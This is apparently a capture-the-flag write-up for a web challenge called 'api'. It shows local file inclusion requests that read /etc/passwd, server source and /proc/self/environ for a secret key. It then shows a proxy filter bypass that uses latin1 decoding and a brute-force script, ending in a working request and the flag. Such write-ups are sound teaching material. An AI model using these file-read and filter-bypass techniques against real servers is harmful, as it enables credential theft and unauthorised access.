# api (270pts, 24 solved) Hard [Web]
                
## First look
When we first open the site, the is no interaction with the application, we can't do anything. Having a dirsearch finds us `/proxy`, I tried to do something with it, but no success

## Solving
Using my scanner, we find that we can trigger `LFI` with `GET file:///../../../../../../etc/passwd`. Using this technique, we can retrieve the server source by: `GET file:///../server.js`. Here we see some interesting functions:
```js
//server.js

//parse requests
var doRequest = require('./routes/doRequest'); 
//helpers
global.functions = require('./resources/functions');
...
//hostname helper
global.hostname = os.hostname();
//todo process.env.SECRET_KEY 
global.secretkey = 'FCD5B14866746FDF0722AD96728CA9B58FE53389E09B97CC462E2CABE02AA19C';
...
var urlParts = urlPath.split('/');
console.log(request.url, ip); 
if(urlParts[0]) {
    switch(urlParts[0]) {
        case 'getconfig':
            functions.getConfigFromVault(request, response);
        break;
        case 'proxy':
            functions.getProxy(request, response);
        break;
        default:
            new doRequest(request, response);
            break;
    }
} else {
    new doRequest(request, response);
}

//functions.js
...
getProxy: function(request, response) {
    this.getRequestFields(request, global.config, function(fields) {

        if(!fields || !fields.url) {
            response.end('Invalid fields.');
        }


        if(fields.url.indexOf('get_secret') !== -1 || fields.url.indexOf('/') !== -1) {
            response.end("Invalid request");
            return;
        }
        
        fields.url = Buffer.from(fields.url.toLowerCase(), "latin1").toString();

        var options = {
            host: global.config.PROXY,
            port: 2222,
            path: fields.url
        };

        http.get(options, function(rresponse) {
            var body = '';
            rresponse.on('data', function(chunk) {
            body += chunk;
            });
            rresponse.on('end', function() {
            response.end(body);
            });
        }).on('error', function(e) {
            response.end("Got error: " + e.message);
        }); 
    });
},
...
getConfigFromVault: function(req, res) {
    var options = {
        host: global.config.PROXY,
        port: 2222,
        path: '/get_secret/' + global.secretkey
    };

    http.get(options, function(response) {
        var body = '';
        response.on('data', function(chunk) {
        body += chunk;
        });
        response.on('end', function() {
        res.end(body);
        });
    }).on('error', function(e) {
        res.end("Got error: " + e.message);
    }); 
},
...

//doRequest is just a simple nodejs static file server
```


Our goal is to get `/get_secret/` from the local server. However, when we go to `/get_secret/`, we don't have access, because of: `{"failed":true,"flag":"","message":"Invalid secret key. Flag hidden."}`. So our `global.secretkey` is probably wrong. Which means it's probably in: `//todo process.env.SECRET_KEY`, which we can get using the `LFI` trick: `GET file:///../../../../../../proc/self/environ`, which is indeed where we find: `SECRET_KEY=f0af17449a83681de22db7ce16672f16f37131bec0022371d4ace5d1854301e0`. However, we need to hit `/get_secret/` and we can't use `/getconfig`, because it doesn't have a variable key.  
So we'll check our other endpoint `/proxy`:
```js
if(fields.url.indexOf('get_secret') !== -1 || fields.url.indexOf('/') !== -1) {
    response.end("Invalid request");
    return;
}

fields.url = Buffer.from(fields.url.toLowerCase(), "latin1").toString();
```
The first check (`fields.url.indexOf('get_secret') !== -1`) can easily be bypassed by using `Get_secret`, since it's lowercased at the end.  
The second check (`fields.url.indexOf('/') !== -1`) is a bit more tricky. But at the end, it not only lowedcases the url, but also decodes it as `latin1`. So maybe there is a character, when decoded as `latin1` is `/`, we can quickly bruteforce this:
```js
let i = 0;

while(true) {
    var char = String.fromCharCode(i);
    var decodedChar = Buffer.from(char.toLowerCase(), "latin1").toString();

    if (decodedChar == "/" && char != "/") {
        console.log(char);
        break;
    }
    i++;
}
```
This find the character: `Į` so chaining our first trick with this one gets us the final URL: `/proxy?url=ĮGet_secretĮf0af17449a83681de22db7ce16672f16f37131bec0022371d4ace5d1854301e0`.
Visiting this gets us the flag: `DCTF{f21030488de73ca25f1446d7f92865d6439b6e6c7f832dfe9c1c7a2b7e45966f}`